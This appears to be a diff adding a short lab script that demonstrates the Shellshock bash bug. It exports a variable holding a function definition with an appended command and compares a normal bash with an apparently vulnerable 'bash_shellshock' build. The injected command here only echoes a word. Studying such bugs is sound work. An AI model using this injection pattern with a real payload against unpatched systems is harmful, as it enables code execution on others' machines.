@@ -1,0 +1,19 @@
+foo='() { echo "Hello"; }; echo "shock!" '
+echo $foo
+declare -f foo
+export foo
+/bin/bash
+echo $foo
+declare -f foo
+foo
+
+
+
+foo='() { echo "Hello"; }; echo "shock!" '
+echo $foo
+declare -f foo
+export foo
+/bin/bash_shellshock
+echo $foo
+declare -f foo
+foo
